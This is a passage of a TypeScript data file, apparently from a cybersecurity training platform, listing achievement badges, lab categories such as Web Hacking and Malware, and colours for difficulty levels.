  { id: 'networking-pro', name: 'Network Ninja', description: 'Completed all networking labs', icon: '🕸️' },
  { id: 'web-master', name: 'Web Wrecker', description: 'Completed all web hacking labs', icon: '🌐' },
  { id: 'linux-guru', name: 'Linux Lord', description: 'Completed all Linux labs', icon: '🐧' },
  { id: 'crypto-cracker', name: 'Code Breaker', description: 'Completed all crypto labs', icon: '🔐' },
  { id: 'india-defender', name: 'Bharat Shield', description: 'Completed all Indian context labs', icon: '🇮🇳' },
  { id: 'top-10', name: 'Top 10', description: 'Reached top 10 on leaderboard', icon: '🏆' },
  { id: 'bug-hunter', name: 'Bug Hunter', description: 'Wrote 5 bug bounty reports', icon: '🐛' },
]

export const labCategories = [
  { name: 'All', icon: '📚' },
  { name: 'Networking', icon: '🌐' },
  { name: 'Web Hacking', icon: '💻' },
  { name: 'Linux', icon: '🐧' },
  { name: 'Cryptography', icon: '🔐' },
  { name: 'Malware', icon: '🦠' },
  { name: 'Indian Context', icon: '🇮🇳' },
]

export const difficultyColors: Record<string, string> = {
  Easy: '#22c55e',
  Medium: '#f59e0b',
  Hard: '#ef4444',
  Expert: '#a855f7',
}
